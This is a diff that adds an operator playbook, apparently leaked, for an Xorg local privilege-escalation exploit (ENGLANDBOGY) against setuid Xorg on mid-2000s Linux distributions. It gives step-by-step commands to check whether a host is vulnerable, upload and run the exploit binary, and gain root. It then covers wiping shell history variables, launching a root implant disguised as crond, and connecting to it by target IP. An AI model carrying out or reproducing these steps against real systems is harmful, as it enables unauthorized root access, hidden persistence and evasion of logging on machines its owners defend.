@@ -1,0 +1,92 @@
+#######################################
+# ENGLANDBOGY
+#######################################
+
+### local exploit against Xorg for the following versions:
+###	Xorg X11R7 1.0.1, X11R7 1.0, X11R6 6.9
+### Includes the following distributions:
+###	MandrakeSoft Linux 10.2, Ubuntu 5.0.4, SuSE Linux 10.0,
+###	RedHat Fedora Core5, MandrakeSoft Linux 2006.0
+### Fails-on - Xorg X11R7 1.0.2 and greater and less than Xorg X11R6 6.9.
+### Requirements - Target needs to have the Xorg binary as SETUID root.
+### 
+
+### Exploits the Xorg X server by allowing unprivileged users load arbitrary modules
+
+### OPSEC: 
+### vulnerability: public
+### exploit: public
+
+### Determine if vulnerable:
+
+uname -a
+
+### get Xorg version; should be one listed above:
+
+Xorg -version
+
+### see if Xorg is setuid root- should look similar to this (-rwsr-xr-x )
+
+ls -la /usr/bin/Xorg
+
+
+### if tests pass, let's do it:
+
+-put /current/up/eb eb
+
+-shell
+./eb
+
+# lots of output similar to this:
+
+       X Window System Version 6.9.0
+       Release Date: 21 December 2005
+       X Protocol Version 11, Revision 0, Release 6.9
+       Build Operating System: SuSE Linux [ELF] SuSE
+       Current Operating System: Linux linux 2.6.16-rc5-git2-2-default #1 Tue Feb 28 09 :16:17 UTC 2006 i686
+       Build Date: 26 February 2006
+               Before reporting problems, check http://wiki.X.Org
+               to make sure that you have the latest version.
+       Module Loader present
+       Markers: (--) probed, (**) from config file, (==) default setting,
+               (++) from command line, (!!) notice, (II) informational,
+               (WW) warning, (EE) error, (NI) not implemented, (??) unknown.
+       (++) Log file: "Xorg.log", Time: Tue Jun  6 10:31:57 2006
+       (==) Using config file: "/etc/X11/xorg.conf"
+       (EE) LoadModule: Module bitmap does not have a bitmapModuleData data object.
+       (EE) Failed to load module "bitmap" (invalid module, 0)
+       (EE) LoadModule: Module pcidata does not have a pcidataModuleData data object.
+       (EE) Failed to load module "pcidata" (invalid module, 0)
+
+       Fatal server error:
+       Unable to load required base modules, Exiting...
+
+
+       Please consult the The X.Org Foundation support
+                at http://wiki.X.Org
+        for help.
+       Please also check the log file at "Xorg.log" for additional information.
+
+
+
+### you probably have root now, so do your unsets:
+
+unset HISTFILE
+unset HISTSIZE
+unset HISTFILESIZE
+id
+
+### start a new noserver as root:
+
+PATH=. crond
+
+
+### Connect to nopen:
+
+-nstun TARGET_IP
+
+### CLEANUP:
+
+# no logging
+
+
